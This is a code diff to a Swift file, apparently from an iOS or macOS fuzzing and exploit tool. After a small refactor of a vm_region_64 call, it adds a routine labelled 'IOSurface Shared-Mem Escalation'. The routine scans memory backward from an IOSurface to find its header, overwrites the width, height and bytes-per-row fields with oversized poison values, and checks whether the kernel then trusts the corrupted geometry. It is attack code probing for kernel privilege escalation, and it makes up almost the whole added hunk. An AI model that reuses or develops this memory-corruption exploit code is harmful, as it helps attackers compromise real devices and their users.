@@ -2314,10 +2314,10 @@ func runVMRegionScan(log: FuzzLog, completion: @escaping () -> Void) {
             var count    = mach_msg_type_number_t(12)
             var objName: mach_port_t = 0
 
-            let kr: kern_return_t = withUnsafeMutablePointer(to: &info) { ip in
-                ip.withMemoryRebound(to: Int32.self, capacity: 12) { rp in
-                    vm_region_64(mach_task_self_, &addr, &size, 13, rp, &count, &objName)
-                }
+            let kr: kern_return_t = withUnsafeMutablePointer(to: &info) { ip -> kern_return_t in
+                vm_region_64(mach_task_self_, &addr, &size, 13,
+                             UnsafeMutableRawPointer(ip).assumingMemoryBound(to: Int32.self),
+                             &count, &objName)
             }
             guard kr == KERN_SUCCESS else { break }
             totalRegions += 1
@@ -2471,7 +2471,126 @@ func runIOSurfaceOOBEscalation(log: FuzzLog, completion: @escaping () -> Void) {
     DispatchQueue.global(qos: .userInitiated).async(execute: {
         let sl = SyncLog()
         func step(_ s: String) { sl.write(s); log.append(s) }
-        step("── IOSurface Escalation (stub) ──")
+
+        step("── IOSurface Shared-Mem Escalation ──")
+
+        let SURF_W:   Int    = 0x1337
+        let SURF_H:   Int    = 0x0042
+        let SURF_BPR: Int    = SURF_W * 4
+        let SURF_FMT: UInt32 = 0x42475241
+
+        let props: [IOSurfacePropertyKey: Any] = [
+            .width:           SURF_W,
+            .height:          SURF_H,
+            .bytesPerRow:     SURF_BPR,
+            .bytesPerElement: 4,
+            .pixelFormat:     Int(SURF_FMT),
+        ]
+        guard let surf = IOSurface(properties: props) else {
+            step("✗ IOSurface create failed"); completion(); return
+        }
+
+        var seed: UInt32 = 0
+        IOSurfaceLock(surf, .readOnly, &seed)
+        let surfBaseRaw = IOSurfaceGetBaseAddress(surf)
+        let allocSz     = IOSurfaceGetAllocSize(surf)
+        IOSurfaceUnlock(surf, .readOnly, &seed)
+        guard UInt(bitPattern: surfBaseRaw) != 0 else {
+            step("✗ IOSurfaceGetBaseAddress returned NULL"); completion(); return
+        }
+
+        let surfVA = UInt(bitPattern: surfBaseRaw)
+        step("pixelBuf VA=0x\(String(surfVA, radix: 16)) allocSz=\(allocSz)")
+
+        var headerStart = surfVA
+        let PAGE_SZ     = 4096
+        let MAX_SCAN    = 256 * 1024
+        for back in stride(from: PAGE_SZ, through: MAX_SCAN, by: PAGE_SZ) {
+            let testVA = surfVA &- UInt(back)
+            let r = msync(UnsafeMutableRawPointer(bitPattern: testVA), PAGE_SZ, Int32(1))
+            if r == -1 { break }
+            headerStart = testVA
+        }
+        let headerOff = Int(surfVA - headerStart)
+        let totalLen  = headerOff + allocSz
+        step("mapping: 0x\(String(headerStart, radix: 16))  hdrOff=\(headerOff)  total=\(totalLen)")
+
+        let basePtr = UnsafeMutableRawPointer(bitPattern: headerStart)!
+                         .assumingMemoryBound(to: UInt8.self)
+
+        let widthOff  = iosFindU32LE(UInt32(SURF_W),   basePtr, totalLen)
+        let heightOff = iosFindU32LE(UInt32(SURF_H),   basePtr, totalLen)
+        let bprOff    = iosFindU32LE(UInt32(SURF_BPR), basePtr, totalLen)
+        let fmtOff    = iosFindU32LE(SURF_FMT,          basePtr, totalLen)
+
+        let wStr   = widthOff  == nil ? "NOT FOUND" : "@ hdr+0x\(String(widthOff!,  radix: 16))"
+        let hStr   = heightOff == nil ? "NOT FOUND" : "@ hdr+0x\(String(heightOff!, radix: 16))"
+        let bprStr = bprOff    == nil ? "NOT FOUND" : "@ hdr+0x\(String(bprOff!,   radix: 16))"
+        let fmtStr = fmtOff    == nil ? "NOT FOUND" : "@ hdr+0x\(String(fmtOff!,   radix: 16))"
+        step("  width  : \(wStr)")
+        step("  height : \(hStr)")
+        step("  BPR    : \(bprStr)")
+        step("  fmt    : \(fmtStr)")
+
+        if headerOff > 0 {
+            step("── header dump ──")
+            iosDumpHex(basePtr, min(headerOff, 256), step: step)
+        } else {
+            step("── pixelbuf dump (hdrOff=0) ──")
+            let surfPtr = UnsafeMutableRawPointer(bitPattern: surfVA)!
+                             .assumingMemoryBound(to: UInt8.self)
+            iosDumpHex(surfPtr, min(256, allocSz), step: step)
+        }
+
+        let POISON_BPR: UInt32 = 0x7FFFFFFF
+        let POISON_DIM: UInt32 = 0x00007FFF
+        var corrupted = false
+
+        if let off = bprOff {
+            UnsafeMutableRawPointer(basePtr.advanced(by: off))
+                .storeBytes(of: POISON_BPR, as: UInt32.self)
+            step("  poisoned BPR @ hdr+0x\(String(off, radix: 16))")
+            corrupted = true
+        }
+        if let off = widthOff {
+            UnsafeMutableRawPointer(basePtr.advanced(by: off))
+                .storeBytes(of: POISON_DIM, as: UInt32.self)
+            step("  poisoned W @ hdr+0x\(String(off, radix: 16))")
+            corrupted = true
+        }
+        if let off = heightOff {
+            UnsafeMutableRawPointer(basePtr.advanced(by: off))
+                .storeBytes(of: POISON_DIM, as: UInt32.self)
+            step("  poisoned H @ hdr+0x\(String(off, radix: 16))")
+            corrupted = true
+        }
+        if !corrupted {
+            step("  no fields found — blind poison @0..11")
+            let raw = UnsafeMutableRawPointer(basePtr)
+            raw.storeBytes(of: POISON_BPR, as: UInt32.self)
+            raw.advanced(by: 4).storeBytes(of: POISON_DIM, as: UInt32.self)
+            raw.advanced(by: 8).storeBytes(of: POISON_DIM, as: UInt32.self)
+        }
+
+        var seed2: UInt32 = 0
+        let lockKR = IOSurfaceLock(surf, [], &seed2)
+        step("  lock kr=\(lockKR)")
+        if lockKR == 0 {
+            let w2   = IOSurfaceGetWidth(surf)
+            let h2   = IOSurfaceGetHeight(surf)
+            let bpr2 = IOSurfaceGetBytesPerRow(surf)
+            step("  post-lock: w=\(w2) h=\(h2) bpr=\(bpr2)")
+            if w2 != SURF_W || h2 != SURF_H || bpr2 != SURF_BPR {
+                step("  *** GEOMETRY CHANGED — kernel trusts shared mem ***")
+            } else {
+                step("  geometry stable — kernel ignores shared mem")
+            }
+            IOSurfaceUnlock(surf, [], &seed2)
+        } else {
+            step("  lock failed kr=\(lockKR)")
+        }
+
+        step("── IOSurface Escalation complete ──────────")
         completion()
     })
 }
